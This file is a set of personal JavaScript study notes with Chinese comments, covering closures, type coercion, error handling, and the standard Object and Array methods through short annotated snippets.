//=====
again:
    for (var i = 0; i < 10; i++) {
        if (i % 2 === 0) continue again;
        console.log(i);
    }
//=====
// JavaScript 有三种方法，可以确定一个值到底是什么类型
// typeof运算符
if (typeof a === "undefined") {
    console.log("变量未定义");
}
// instanceof运算符
if ([] instanceof Array) {
    console.log("目标变量是数组");
}
if ({}
    instanceof Object) {
    console.log("目标变量是对象");
}
// Object.prototype.toString方法 
//=====
if ({}) {
    console.log("{}是真");
}
if ([]) {
    console.log("[]是真");
    console.log([].length);
}
//=====
console.log(parseInt("10001", 2));
console.log(parseInt("10001"));
//=====
var str = (function () {
    /*
       line 1
       line 2
       line 3
       */
});
console.log(str.toString().split("\n").slice(2, -2).join("\n"));
//=====
//JavaScript 原生提供两个 Base64 相关的方法。
// btoa()：任意值转为 Base64 编码
console.log(btoa("lvbo"));
// atob()：Base64 编码转为原来的值
console.log(atob("bHZibw=="));
// 将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节
console.log(btoa(encodeURIComponent("lvbo")));
console.log(decodeURIComponent(atob("bHZibw==")));
//=====
// 遇到行首是一个大括号，无法确定是对象还是代码块，一律解释为代码块
{
    console.log(123)
}
// 如果要解释为对象，最好在大括号前加上圆括号。
// 因为圆括号的里面，只能是表达式，所以确保大括号只能解释为对象。
({
    foo: 123
})
//=====
// 查看一个对象本身的所有属性
console.log(Object.keys({
    key1: 1,
    key2: 2
}));
// 属性的删除：delete 命令
// 删除对象的属性，删除成功后返回true
// 删除一个不存在的属性，delete不报错，而且返回true
// 只有一种情况，delete命令会返回false，那就是该属性存在，且不得删除
// delete命令只能删除对象本身的属性，无法删除继承的属性
var obj1 = {
    a: 5
};
delete obj1.a;
console.log(typeof obj1.a === "undefined");
// in运算符用于检查对象是否包含某个属性
// 不能识别哪些属性是对象自身的，哪些属性是继承的
// hasOwnProperty判断是否为对象自身的属性
var obj1 = {
    a: 4
};
console.log("a" in obj1);
if ("toString" in obj1) {
    console.log("结果是：" + Object.hasOwnProperty("toString"));
}
// for...in循环用来遍历一个对象的全部属性
// 它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性
// 它不仅遍历对象自身的属性，还遍历继承的属性
var obj1 = {
    name: "吕博",
    sex: "男"
};
for (var key in obj1) {
    if (obj1.hasOwnProperty(key)) {
        console.log(key);
    } else {
        console.log("当前属性是继承属性");
    }
}
//=====
// 函数本身也是一个值，也有自己的作用域。
// 它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。
// 正是这种机制，构成了“闭包”现象。
function fn() {
    var a = 1;

    function fn1() {
        console.log(a);
    }
    return fn1;
}
var f = fn();
f();
// 没有办法只省略靠前的参数，而保留靠后的参数。
// 如果一定要省略靠前的参数，只有显式传入undefined
function fnArguments(a, b) {
    console.log(a, b);
}
fnArguments(undefined, 5);
// arguments 对象
// 正常模式下，arguments对象可以在运行时修改
// 严格模式下，修改arguments对象不会影响到实际的函数参数。
var f1 = function (a, b) {
    'use strict'; // 开启严格模式
    arguments[0] = 3;
    arguments[1] = 2;
    return a + b;
};
console.log(f1(1, 1));
// arguments转换为数组的两种方式

function fn3() {
    var args = Array.prototype.slice.call(arguments);
    // 或者
    var args = [];
    for (var i = 0; i < arguments.length; i++) {
        args.push(arguments[i]);
    }
}
//   name属性的一个用处，就是获取参数函数的名字
function add() {
    console.log("add");
}
console.log(add.name);
// length属性返回函数预期传入的参数个数，即函数定义之中的参数个数
// length属性提供了一种机制，判断定义时和调用时参数的差异，
// 以便实现面向对象编程的“方法重载”（overload）。

// 函数的toString方法返回一个字符串，内容是函数的源码
function fn2() {
    console.log("this is function toString");
}
console.log(fn2.toString());
// 可以把闭包简单理解成“定义在一个函数内部的函数”
// 闭包的最大用处有两个，一个是可以读取函数内部的变量，
// 另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在
function f9() {
    var n = 999;

    function f2() {
        console.log(n);
    }
    return f2;
}
var result1 = f9();
result1();
// 闭包的另一个用处，是封装对象的私有属性和私有方法
function obj5() {
    var a;
    var b = function (n) {
        a = n;
    };
    var c = function () {
        console.log(a);
    };
    return {
        b: b,
        c: c
    }
}
var obj2 = obj5();
obj2.b("我是中国人");
obj2.c();
// function这个关键字即可以当作语句，也可以当作表达式
// 为了避免解析上的歧义，JavaScript 引擎规定，如果function关键字出现在行首，一律解释成语句
// 语句
function f() {}
// 表达式
var f = function f() {}
// 任何让解释器以表达式来处理函数定义的方法,都能定义立即调用函数
(function () {
    /* code */
}());
(function () {
    /* code */
})();
var i = function () {
    return 10;
}();
true && function () {
    /* code */
}();
0,
function () {
    /* code */
}();
// 目的有两个：一是不必为函数命名，避免了污染全局变量；
// 二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。
(function () {
    var tmp = "newData";
    // processData(tmp);
    // storeData(tmp);
}());
//=====
// 本质上，数组属于一种特殊的对象。typeof运算符会返回数组的类型是object
// JavaScript 语言规定，对象的键名一律为字符串，所以，数组的键名其实也是字符串
// 数组成员的键名是固定的（默认总是0、1、2...）
// JavaScript 使用一个32位整数保存数组的元素个数。
// 这意味着，数组成员最多只有 4294967295 个（232 - 1）个
// 清空数组的一个有效方法，就是将length属性设为0
// 当length属性设为大于数组个数时，读取新增的位置都会返回undefined。
// 如果数组的键名是添加超出范围的数值，该键名会自动转为字符串
var arr = [];
arr[-1] = 'a';
arr[Math.pow(2, 32)] = 'b';
console.log(arr);
// 检查某个键名是否存在的运算符in，适用于对象，也适用于数组
// 如果数组的某个位置是空位，in运算符返回false
var arr = [];
arr[100] = 'a';
100 in arr // true
1 in arr // false
// for...in循环不仅可以遍历对象，也可以遍历数组
// for...in不仅会遍历数组所有的数字键，还会遍历非数字键,
// 所以，不推荐使用for...in遍历数组。
var a = [1, 2, 3];
a.foo = true;
for (var key in a) {
    console.log(key);
}
// 0
// 1
// 2
// foo
// 数组的遍历可以考虑使用for循环或while循环
var a = [1, 2, 3];
// for循环
for (var i = 0; i < a.length; i++) {
    console.log(a[i]);
}
// while循环
var i = 0;
while (i < a.length) {
    console.log(a[i]);
    i++;
}
// while循环,逆向遍历
var l = a.length;
while (l--) {
    console.log(a[l]);
}
// 数组的forEach方法
var colors = ['red', 'green', 'blue'];
colors.forEach(function (color) {
    console.log(color);
});
// red
// green
// blue
// 两个逗号之间没有任何值，我们称该数组存在空位
// 数组的空位不影响length属性
var a = [1, , 1];
a.length // 3
// 使用delete命令删除一个数组成员，会形成空位，并且不会影响length属性
// length属性不过滤空位。所以，使用length属性进行数组遍历，一定要非常小心。
var a = [1, 2, 3];
delete a[1];
a[1] // undefined
a.length // 3
// 数组的某个位置是空位，与某个位置是undefined，是不一样的。
// 如果是空位，使用数组的forEach方法、for...in结构、
// 以及Object.keys方法进行遍历，空位都会被跳过。
var arr6 = [, , , ];
for (var i = 0; i < arr6.length; i++) {
    console.log(arr6[i] === undefined ? "空位" : "不是空位");
}
// 类似数组的对象”的根本特征，就是具有length属性
// 典型的“类似数组的对象”是函数的arguments对象，以及大多数 DOM 元素集，还有字符串。
// 数组的slice方法可以将“类似数组的对象”变成真正的数组
var arrayLike = {
    0: 2,
    1: 3,
    length: 4
};
var arr = Array.prototype.slice.call(arrayLike);
// 类似数组的对象”可以通过call()把数组的方法放到对象上面,然后使用数组的方法，
// 这种方法比直接使用数组原生的forEach要慢，
// 所以最好还是先将“类似数组的对象”转为真正的数组，然后再直接调用数组的forEach方法
function logArgs() {
    Array.prototype.forEach.call(arguments, function (elem, i) {
        console.log(i + '. ' + elem);
    });
}
//=====
// 对象的相加,必须先转成原始类型的值，然后再相加
// 对象转成原始类型的值，规则如下
// 首先，自动调用对象的valueOf方法,一般来说，对象的valueOf方法总是返回对象自身,
// 这时再自动调用对象的toString方法，将其转为字符串
// 对象的toString方法默认返回[object Object]
var obj = {
    p: 1
};
obj.valueOf() // { p: 1 }
obj.valueOf().toString() // "[object Object]"
// 这里有一个特例，如果运算子是一个Date对象的实例，那么会优先执行toString方法。
var obj = new Date();
obj.valueOf = function () {
    return 1
};
obj.toString = function () {
    return 'hello'
};
obj + 2 // "hello2"
// void运算符的作用是执行一个表达式，然后返回undefined
void(0); // undefined
// 主要用途是浏览器的书签工具（Bookmarklet），以及在超级链接中插入代码防止网页跳转。
({
    /* <script>
    function f() {
      console.log('Hello World');
    }
    </script>
    <a href="http://example.com" onclick="f(); return false;">点击</a> */
});
// void运算符可以取代上面的写法。
({
    /* <a href="javascript: void(f())">文字</a>
    <a href="javascript: void(document.form.submit())">
      提交
    </a> */
});
//=====
// 逗号运算符用于对两个表达式求值，并返回后一个表达式的值
// 逗号运算符的一个用途是，在返回一个值之前，进行一些辅助操作
var value = (console.log("你好："), "lvbo");
console.log(value);
//=====
// 圆括是一种语法结构。它一共有两种用法：一种是把表达式放在圆括号之中，
// 提升运算的优先级；另一种是跟在函数的后面，作用是调用函数。
var z = 5;
var b = 0;
w = (x = (y = z));
q = a ? b : (c ? d : (e ? f : g));
// 少数运算符的计算顺序是从右到左，即从右边开始计算，这叫做运算符的“右结合”
// 其中，最主要的是赋值运算符（=）和三元条件运算符（?:）还有指数运算符(**)
2 ** 3 ** 2 // 相当于 2 ** (3 ** 2) // 512
//=====
// 强制转换 Number()
// 原始类型值
Number(324) // 324
Number('324') // 324
Number('') // 0
Number(true) // 1
Number(false) // 0
Number(undefined) // NaN
Number(null) // 0
Number('42 cats') // NaN
parseInt('42 cats') // 42
// 对象
// Number方法的参数是对象时，将返回NaN，除非是包含单个数值的数组。
Number({
    a: 1
}) // NaN
Number([1, 2, 3]) // NaN
Number([5]) // 5
// Number背后的转换规则
// 第一步，调用对象自身的valueOf方法。如果返回原始类型的值，则直接对该值使用Number函数，
// 不再进行后续步骤。第二步，如果valueOf方法返回的还是对象，则改为调用对象
// 自身的toString方法。如果toString方法返回原始类型的值，则对该值使用Number函数，
// 不再进行后续步骤。第三步，如果toString方法返回的是对象，就报错。
var obj = {
    x: 1
};
Number(obj) // NaN
// 等同于
if (typeof obj.valueOf() === 'object') {
    Number(obj.toString());
} else {
    Number(obj.valueOf());
}
//强制转换 String()
// 原始类型值
String(123) // "123"
String('abc') // "abc"
String(true) // "true"
String(undefined) // "undefined"
String(null) // "null"
// 对象
// String方法的参数如果是对象，返回一个类型字符串；如果是数组，返回该数组的字符串形式
String({
    a: 1
}) // "[object Object]"
String([1, 2, 3]) // "1,2,3"
// String方法背后的转换规则
// 先调用对象自身的toString方法。如果返回原始类型的值，则对该值使用String函数，
// 不再进行以下步骤。如果toString方法返回的是对象，再调用原对象的valueOf方法。
// 如果valueOf方法返回原始类型的值，则对该值使用String函数，不再进行以下步骤。
// 如果valueOf方法返回的是对象，就报错。
// 强制转换 Boolean()
// Boolean()函数可以将任意类型的值转为布尔值
// 除了以下五个值的转换结果为false，其他的值全部为true。
Boolean(undefined) // false
Boolean(null) // false
Boolean(0) // false
Boolean(NaN) // false
Boolean('') // false
//-------------------- 
Boolean(true) // true
Boolean(false) // false
// 所有对象的布尔值都是true，这是因为 JavaScript 语言设计的时候，出于性能的考虑，
// 如果对象需要计算才能得到布尔值，可能会需要较多的计算。
// 为了保证性能，就统一规定，对象的布尔值为true。
Boolean({}) // true
Boolean([]) // true
Boolean(new Boolean(false)) // true
//=====
// 错误处理机制
// Error 实例对象
// JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。
// JavaScript 原生提供Error构造函数，所有抛出的错误都是这个构造函数的实例。
// JavaScript 语言标准只提到，Error实例对象必须有message属性，表示出错时的提示信息
var err = new Error("出错了");
console.log(err.message);
// 原生错误类型 
// Error实例对象是最一般的错误类型，在它的基础上，
// JavaScript 还定义了其他6种错误对象。也就是说，存在Error的6个派生对象
// SyntaxError对象是解析代码时发生的语法错误
// var 1a;
// Uncaught SyntaxError: Invalid or unexpected token
//-------------------- 
// ReferenceError对象是引用一个不存在的变量时发生的错误
// unknownVariable
// Uncaught ReferenceError: unknownVariable is not defined
//--------------------
// RangeError对象是一个值超出有效范围时发生的错误
// new Array(-1)
// Uncaught RangeError: Invalid array length
//--------------------
// TypeError对象是变量或参数不是预期类型时发生的错误
// new 123
// Uncaught TypeError: number is not a func
//--------------------
// URIError对象是 URI 相关函数的参数不正确时抛出的错误
// 主要涉及encodeURI()、decodeURI()、encodeURIComponent()、decodeURIComponent()、
// escape()和unescape()这六个函数。
// decodeURI('%2')
// URIError: URI malformed
//--------------------
// eval函数没有被正确执行时，会抛出EvalError错误。
// 该错误类型已经不再使用了，只是为了保证与以前代码兼容，才继续保留
// 总结
// 6种派生错误，连同原始的Error对象，都是构造函数。
// 开发者可以使用它们，手动生成错误对象的实例。
// 这些构造函数都接受一个参数，代表错误提示信息
var err1 = new Error('出错了！');
var err2 = new RangeError('出错了，变量超出有效范围！');
var err3 = new TypeError('出错了，变量类型无效！');

console.log(err1.message); // "出错了！"
console.log(err2.message); // "出错了，变量超出有效范围！"
console.log(err3.message); // "出错了，变量类型无效！"
// 自定义错误 
// 除了 JavaScript 原生提供的七种错误对象，还可以定义自己的错误对象
var mineError = function (message) {
    this.message = message || "代码出错了";
    this.name = "mineError";
}
mineError.prototype = Error.prototype;
mineError.prototype.constructor = mineError;
var mine1 = new mineError();
console.log(mine1.message);
console.log(mine1);
// throw new mineError();
// throw 语句
// throw语句的作用是手动中断程序执行，抛出一个错误
// JavaScript引擎遇到throw语句，程序就中止了。引擎会接收到throw抛出的信息
//--------------------
// 抛出一个字符串
// throw 'Error！';// Uncaught Error！
// 抛出一个数值
// throw 42;// Uncaught 42
// 抛出一个布尔值
// throw true;// Uncaught true
// 抛出一个对象
// throw {
//   toString: function () {
//     return 'Error!';
//   }
// };// Uncaught {toString: ƒ}
//--------------------
// try...catch 结构
// JavaScript 提供了try...catch结构，允许对错误进行处理，选择是否往下执行
// try代码块抛出错误，JavaScript 引擎就立即把代码的执行，转到catch代码块，
// catch接受一个参数，表示try代码块抛出的值
try {
    throw new Error("代码出错了");
} catch (e) {
    console.log(e.message);
}
// catch捕获错误之后，会判断错误类型，进行不同的处理
try {
    foo.bar();
} catch (e) {
    if (e instanceof EvalError) {
        console.log(e.message);
    } else if (e instanceof RangeError) {
        console.log(e.message);
    }
}
// finally 代码块 
// try...catch结构允许在最后添加一个finally代码块，
// 表示不管是否出现错误，都必需在最后运行的语句
// 中断执行之前，会先执行finally代码块，然后再向用户提示报错信息。
function cleansUp() {
    try {
        throw new Error('出错了……');
        console.log('此行不会执行');
    } finally {
        console.log('完成清理工作');
    }
}
//   cleansUp();
// return语句的执行是排在finally代码之前，只是等finally代码执行完毕后才返回
var count = 0;

function countUp() {
    try {
        return count;
    } finally {
        count++;
    }
}
console.log(countUp()); // 0
console.log(count); // 1
// finally代码块用法的典型场景
// 代码首先打开一个文件，然后在try代码块中写入文件，如果没有发生错误，
// 则运行finally代码块关闭文件；一旦发生错误，
// 则先使用catch代码块处理错误，再使用finally代码块关闭文件
function test() {
    openFile();
    try {
        writeFile(Data);
    } catch (e) {
        handleError(e);
    } finally {
        closeFile();
    }
}
// 下面代码充分反映了try...catch...finally这三者之间的执行顺序
function f00() {
    try {
        console.log(0);
        throw 'bug';
    } catch (e) {
        console.log(1);
        return true; // 这句原本会延迟到 finally 代码块结束再执行
        console.log(2); // 不会运行
    } finally {
        console.log(3);
        return false; // 这句会覆盖掉前面那句 return
        console.log(4); // 不会运行
    }
    console.log(5); // 不会运行
}
var result = f00();
// 0
// 1
// 3
console.log(result); // false
// catch代码块之中，触发转入finally代码快的标志，不仅有return语句，还有throw语句
// 进入catch代码块之后，一遇到throw语句，就会去执行finally代码块，其中有return false语句，
// 因此就直接返回了，不再会回去执行catch代码块剩下的部分了
function f12() {
    try {
        throw '出错了！';
    } catch (e) {
        console.log('捕捉到内部错误');
        throw e; // 这句原本会等到finally结束再执行
    } finally {
        return false; // 直接返回
    }
}
try {
    f12();
} catch (e) {
    // 此处不会执行
    console.log('caught outer "bogus"');
}
//  捕捉到内部错误
// try代码块内部，还可以再使用try代码块
// try里面还有一个try。内层的try报错（console拼错了），
// 这时会执行内层的finally代码块，然后抛出错误，被外层的catch捕获
try {
    try {
        consle.log('Hello world!'); // 报错
    } finally {
        console.log('Finally');
    }
    console.log('Will I run?');
} catch (error) {
    console.log(error.message);
}
// Finally
// consle is not defined
//=====
// 编程风格
// 缩进用空格、行尾加分号、尽量少用全局变量、变量声明放在代码前面、
// 用严格相等替代相等、不要将不同目的的语句合并成一行、自增自减运算符用+=1/-=1代替、
// 统一使用""
// switch...case结构用对象结构代替
function doAction(action) {
    switch (action) {
        case 'hack':
            return 'hack';
        case 'slash':
            return 'slash';
        case 'run':
            return 'run';
        default:
            throw new Error('Invalid action.');
    }
}
// 改写成对象结构如下：
function doAction(action) {
    var actions = {
        hack: function () {
            return 'hack';
        },
        slash: function () {
            return 'slash';
        },
        run: function () {
            return 'run';
        }
    };
    if (typeof actions[action] !== 'function') {
        throw new Error('Invalid action');
    }
    return actions[action]();
};
console.log(doAction("hack"));
// key值为数字或空时的读取
var obj11 = {
    1: "吕博",
    "": "23"
};
console.log(obj11[1], obj11[""]);
//=====
// console 对象
// 对于某些复合类型的数据，console.table方法可以将其转为表格显示
var languages = [{
        name: "JavaScript",
        fileExtension: ".js"
    },
    {
        name: "TypeScript",
        fileExtension: ".ts"
    },
    {
        name: "CoffeeScript",
        fileExtension: ".coffee"
    }
];
console.table(languages);
// console.count()方法用于计数，输出它被调用了多少次
// 该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类
function greet(user) {
    console.count(user);
    return "hi " + user;
}
greet('bob'); // bob: 1 // "hi bob"
greet('alice'); // alice: 1 // "hi alice"
greet('bob'); // bob: 2 // "hi bob"
// console.time()，console.timeEnd()
// 这两个方法用于计时，可以算出一个操作所花费的准确时间
console.time('forTime');
var i = 0;
for (i; i <= 1000; i++) {}
console.timeEnd('forTime');

console.time('whileTime');
var i = 0;
while (i <= 1000) {
    i += 1;
};
console.timeEnd('whileTime');
// 控制台命令行 API
// inspect()在控制台中显示制定dom对象
// ----  inspect(document.body)
// getEventListeners(object)
// keys(object)，values(object)
// monitorEvents(object[, events]) ，unmonitorEvents(object[, events])
/* -----  monitorEvents(window, "resize");
monitorEvents(window, ["resize", "scroll"])
monitorEvents($0, 'mouse');
unmonitorEvents($0, 'mousemove'); ---- */
//=====
// 标准库 Object 对象
// JavaScript 原生提供Object对象
// JavaScript 的所有其他对象都是Object的实例。
// Object对象的原生方法分成两类：Object本身的方法与Object的实例方法。
// 本身的方法就是直接定义在Object对象的方法。
// 实例方法就是定义在Object原型对象Object.prototype上的方法
// Object作为函数的用法
// 当作工具方法使用，将任意值转为对象，常用于保证某个值一定是对象。
// 如果Object方法的参数是一个对象，它总是返回该对象，即不用转换
// 利用这一点，可以写一个判断变量是否为对象的函数
var isObj = function (value) {
    return value === Object(value);
};
console.log(isObj([]));
console.log(isObj(true));
// 当作构造函数使用,Object构造函数的首要用途，是直接通过它来生成新对象
// Object(value)与new Object(value)两者的语义是不同的，Object(value)表示
// 将value转成一个对象，new Object(value)则表示新生成一个对象，它的值是value。
var o1 = {
    a: 1
};
var o2 = new Object(o1);
o1 === o2 // true
// Object对象的原生方法，分成对象自身的方法（又称为“静态方法”）和实例方法两部分
// Object 的静态方法
// Object.keys方法和Object.getOwnPropertyNames方法都用来遍历对象自身（而不是继承的）的属性
// Object.keys方法只返回可枚举的属性
// Object.getOwnPropertyNames方法还返回不可枚举的属性名
var obja22 = [22, 44]
console.log(Object.getOwnPropertyNames(obja22), Object.keys(obja22));
// 对象属性模型的相关方法
// Object.getOwnPropertyDescriptor()：获取某个属性的描述对象。
// 它的第一个参数是目标对象，第二个参数是一个字符串，对应目标对象的某个属性名
// 只能用于对象自身的属性，不能用于继承的属性。
var obj = {
    p: 'a'
};
Object.getOwnPropertyDescriptor(obj, 'p');
// Object.defineProperty()：通过描述对象，定义某个属性。
// 通过属性描述对象，定义或修改一个属性，然后返回修改后的对象
// writable、configurable、enumerable这三个属性的默认值都为false
var obj = Object.defineProperty({}, 'p', {
    value: 123,
    writable: false,
    enumerable: true,
    configurable: false
});
obj.p // 123
obj.p = 246;
obj.p // 123
// Object.defineProperties()：通过描述对象，定义多个属性。
// writable、configurable、enumerable这三个属性的默认值都为false
// 一旦定义了取值函数get（或存值函数set），
// 就不能将writable属性设为true，或者同时定义value属性，否则会报错
var obj = Object.defineProperties({}, {
    p1: {
        value: 123,
        enumerable: true
    },
    p2: {
        value: 'abc',
        enumerable: true
    },
    p3: {
        get: function () {
            return this.p1 + this.p2
        },
        enumerable: true,
        configurable: true
    }
});
obj.p1 // 123
obj.p2 // "abc"
obj.p3 // "123abc"
//   存取器的两种写法
// 属性描述对象写法
var obj = Object.defineProperty({}, 'p', {
    get: function () {
        return 'getter';
    },
    set: function (value) {
        console.log('setter: ' + value);
    }
});
obj.p // "getter"
obj.p = 123 // "setter: 123"
// 对象方法的写法
var obj = {
    get p() {
        return 'getter';
    },
    set p(value) {
        console.log('setter: ' + value);
    }
};
// 存取器往往用于，属性的值依赖对象内部数据的场合
var obj = {
    $n: 5,
    get next() {
        return this.$n++
    },
    set next(n) {
        if (n >= this.$n) this.$n = n;
        else throw new Error('新的值必须大于当前值');
    }
};
// 对象的拷贝
var extend = function (to, from) {
    for (var property in from) {
        if (!from.hasOwnProperty(property)) continue;
        Object.defineProperty(
            to,
            property,
            Object.getOwnPropertyDescriptor(from, property)
        );
    }
    return to;
}
extend({}, {
    get a() {
        return 1
    }
}); // { get a(){ return 1 } })
// 控制对象状态的方法
// 有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，
// 最弱的一种是Object.preventExtensions，其次是Object.seal，最强的是Object.freeze。
// Object.preventExtensions()：防止对象扩展。
// Object.preventExtensions方法可以使得一个对象无法再添加新的属性
/* var obj = new Object();
Object.preventExtensions(obj);
Object.defineProperty(obj, 'p', {
  value: 'hello'
});// TypeError: Cannot define property:p, object is not extensible. */
// Object.isExtensible()：判断对象是否可扩展。
var obj = new Object();
Object.isExtensible(obj) // true
Object.preventExtensions(obj);
Object.isExtensible(obj) // false
// Object.seal()：禁止对象配置。
// Object.seal方法使得一个对象既无法添加新属性，也无法删除旧属性
var obj = {
    p: 'hello'
};
Object.seal(obj);
delete obj.p;
obj.p // "hello"
obj.x = 'world';
obj.x // undefined
// Object.isSealed()：判断一个对象是否可配置。
// Object.freeze()：冻结一个对象。
// Object.freeze方法可以使得一个对象无法添加新属性、无法删除旧属性、
// 也无法改变属性的值，使得这个对象实际上变成了常量
var obj = {
    p: 'hello'
};
obj.p = 'world';
obj.p // "hello"
obj.t = 'hello';
obj.t // undefined
delete obj.p // false
obj.p // "hello"
// Object.isFrozen()：判断一个对象是否被冻结。
// 局限性
// 1.可以通过改变原型对象，来为对象增加属性。
var obj = new Object();
Object.preventExtensions(obj);
var proto = Object.getPrototypeOf(obj);
proto.t = 'hello';
obj.t // hello
// 解决办法 把原型对象冻结住
var obj = new Object();
Object.preventExtensions(obj);
var proto = Object.getPrototypeOf(obj);
Object.preventExtensions(proto);
proto.t = 'hello';
obj.t // undefined
// 2.如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容
var obj = {
    foo: 1,
    bar: ['a', 'b']
};
Object.freeze(obj);
obj.bar.push('c');
obj.bar; // ["a", "b", "c"]
// 原型链相关方法
// Object.create()：该方法可以指定原型对象和属性，返回一个新的对象。
// Object.getPrototypeOf()：获取对象的Prototype对象。
// Object 的实例方法
// 主要有以下六个
// Object.prototype.valueOf()：返回当前对象对应的值。
// valueOf方法的作用是返回一个对象的“值”，默认情况下返回对象本身
// valueOf方法的主要用途是，JavaScript 自动类型转换时会默认调用这个方法
var obj = new Object();
console.log(1 + obj); // "1[object Object]"
// Object.prototype.toString()：返回当前对象对应的字符串形式。
// toString方法的作用是返回一个对象的字符串形式，默认情况下返回类型字符串
// 因此可以用来判断一个值的类型。
// 其中第二个Object表示该值的构造函数。这是一个十分有用的判断数据类型的方法。
// 由于实例对象可能会自定义toString方法，所以为了得到类型字符串，
// 最好直接使用Object.prototype.toString方法。
// 通过函数的call方法，可以在任意值上调用这个方法，帮助我们判断这个值的类型。
var o1 = new Object();
o1.toString() // "[object Object]"
Object.prototype.toString.call(o1);
// Object.prototype.toString可以看出一个值到底是什么类型,
// 利用这个特性，写出一个比typeof运算符更准确的类型判断函数
var type = function (o) {
    var s = Object.prototype.toString.call(o);
    return s.match(/\[object (.*?)\]/)[1].toLowerCase();
};

['Null',
    'Undefined',
    'Object',
    'Array',
    'String',
    'Number',
    'Boolean',
    'Function',
    'RegExp'
].forEach(function (t) {
    type['is' + t] = function (o) {
        return type(o) === t.toLowerCase();
    };
});
type.isObject({}) // true
type.isNumber(NaN) // true
type.isRegExp(/abc/) // true
// Object.prototype.toLocaleString()：返回当前对象对应的本地字符串形式。
// Object.prototype.hasOwnProperty()：判断某个属性是否为当前对象自身的属性，
// 还是继承自原型对象的属性。
var obj = {
    p: 123
};
obj.hasOwnProperty('p') // true
obj.hasOwnProperty('toString') // false
console.log(Object.prototype.hasOwnProperty.call(obj, 'p'));
console.log(Object.prototype.hasOwnProperty.call(obj, 'toString'));
// Object.prototype.isPrototypeOf()：判断当前对象是否为另一个对象的原型。
// Object.prototype.propertyIsEnumerable()：判断某个属性是否可枚举。
// 用来判断某个属性是否可遍历。注意，这个方法只能
// 用于判断对象自身的属性，对于继承的属性一律返回false。
var obj = {};
obj.p = 123;
obj.propertyIsEnumerable('p'); // true
obj.propertyIsEnumerable('toString'); // false
// =====
// 属性描述对象
// 属性描述对象提供6个元属性
var a = {
    value: 123,
    writable: false,
    enumerable: true,
    configurable: false,
    get: undefined,
    set: undefined
}
// =====
// Array 对象
// Array构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致
// 因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法。
var arr = new Array(1, 2); // bad
var arr = [1, 2]; // good
// 静态方法 
// Array.isArray()
// 方法返回一个布尔值，表示参数是否为数组
var arr = [1, 2, 3];
typeof arr // "object"
Array.isArray(arr) // true
// 实例方法
// valueOf()，toString()
// 数组的valueOf方法返回数组本身,toString方法返回数组的字符串形式
var arr = [1, 2, 3];
arr.valueOf() // [1, 2, 3]
arr.toString() // "1,2,3"
var arr = [1, 2, 3, [4, 5, 6]];
arr.toString() // "1,2,3,4,5,6"
// push()，pop() 方法会改变原数组
// push方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。
// pop方法用于删除数组的最后一个元素，并返回该元素
// 对空数组使用pop方法，不会报错，而是返回undefined。
var arr = [];
arr.push(1); // 1
arr.push('a'); // 2
arr.push(true, {}); // 4
arr; // [1, 'a', true, {}]
var arr = ['a', 'b', 'c'];
arr.pop(); // 'c'
arr // ['a', 'b']
console.log([].pop()); // undefined
// unshift(),shift() 方法会改变原数组。
// unshift()方法用于在数组的第一个位置添加多个参数，并返回添加新元素后的数组长度
var a = ['a', 'b', 'c'];
a.unshift('x'); // 4
a // ['x', 'a', 'b', 'c']
var arr = ['c', 'd'];
arr.unshift('a', 'b'); // 4
arr; // [ 'a', 'b', 'c', 'd' ]
// shift()方法用于删除数组的第一个元素，并返回该元素
var a = ['a', 'b', 'c'];
a.shift() // 'a'
a // ['b', 'c']
// shift()方法可以遍历并清空一个数组
var list = [1, 2, 3, 4];
var item;
while (item = list.shift()) {
    console.log(item);
}
list // []
// join()
// 方法以指定参数作为分隔符，将所有数组成员连接
// 为一个字符串返回。如果不提供参数，默认用逗号分隔
// 如果数组成员是undefined或null或空位，会被转成空字符串
var a = [1, 2, 3, 4];
a.join(' '); // '1 2 3 4'
a.join(' | '); // "1 | 2 | 3 | 4"
a.join(); // "1,2,3,4"
[undefined, null].join('#'); // '#'
['a', , 'b'].join('-'); // 'a--b'
// 通过call方法，这个方法也可以用于字符串或类似数组的对象
Array.prototype.join.call('hello', '-'); // "h-e-l-l-o"
var obj = {
    0: 'a',
    1: 'b',
    length: 2
};
Array.prototype.join.call(obj, '-'); // 'a-b'
// concat()
// 方法用于多个数组的合并。它将新数组的成员，添加到原数组
// 成员的后部，然后返回一个新数组，原数组不变
// 除了数组作为参数，concat也接受其他类型的值作为参数，添加到目标数组尾部。
['hello'].concat(['world']); // ["hello", "world"]
['hello'].concat(['world'], ['!']); // ["hello", "world", "!"]
[].concat({
    a: 1
}, {
    b: 2
}); // [{ a: 1 }, { b: 2 }]
[2].concat({
    a: 1
}); // [2, {a: 1}]
[1, 2, 3].concat(4, 5, 6); // [1, 2, 3, 4, 5, 6]
// 如果数组成员包括对象，concat方法返回当前数组的一个浅拷贝。
// 所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。
var obj = {
    a: 1
};
var oldArray = [obj];
var newArray = oldArray.concat();
obj.a = 2;
newArray[0].a // 2
// reverse()
// reverse方法用于颠倒排列数组元素，返回改变后的数组。该方法将改变原数组。
var a = ['a', 'b', 'c'];
a.reverse() // ["c", "b", "a"]
a // ["c", "b", "a"]
// slice()
// slice方法用于提取目标数组的一部分，返回一个新数组，原数组不变
// 第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。
// 如果省略第二个参数，则一直返回到原数组的最后一个成员
// lice没有参数，实际上等于返回一个原数组的拷贝
var a = ['a', 'b', 'c'];
a.slice(0) // ["a", "b", "c"]
a.slice(1) // ["b", "c"]
a.slice(1, 2) // ["b"]
a.slice(2, 6) // ["c"]
a.slice() // ["a", "b", "c"]
// 如果slice方法的参数是负数，则表示倒数计算的位置
// 如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组
var a = ['a', 'b', 'c'];
a.slice(-2) // ["b", "c"]
